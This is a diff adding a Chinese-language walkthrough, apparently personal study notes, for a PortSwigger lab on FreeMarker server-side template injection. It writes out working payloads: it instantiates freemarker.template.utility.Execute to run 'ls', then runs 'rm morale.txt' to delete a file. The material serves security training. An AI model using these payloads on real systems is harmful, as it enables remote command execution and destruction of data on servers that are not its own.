@@ -155,6 +155,45 @@ fetch(
 );
 ```
 
+## Lab: Server-side template injection using documentation
+
+| Dimension | Description                                                                                                                           |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/server-side-template-injection/exploiting#read-about-the-security-implications                   |
+| Lab       | https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation |
+
+在 https://0a4000cf045179d081c3116c008a001f.web-security-academy.net/product/template?productId=1 有編輯模板的功能
+
+1. 嘗試 `${product}`
+
+`lab.actions.templateengines.FreeMarkerProduct@16e7dcfd`
+
+[FreeMarker 官方文件](https://freemarker.apache.org/index.html)
+
+[Seldom used and expert built-ins](https://freemarker.apache.org/docs/ref_builtins_expert.html)
+
+2. 嘗試 `${"1+2"?eval}`
+
+`3`
+
+3. 嘗試
+
+```
+<#assign x="freemarker.template.utility.Execute"?new()>
+${x("ls")}
+```
+
+morale.txt
+
+4. 嘗試
+
+```
+<#assign x="freemarker.template.utility.Execute"?new()>
+${x("rm morale.txt")}
+```
+
+成功刪除
+
 ## 參考資料
 
 - https://portswigger.net/web-security/server-side-template-injection
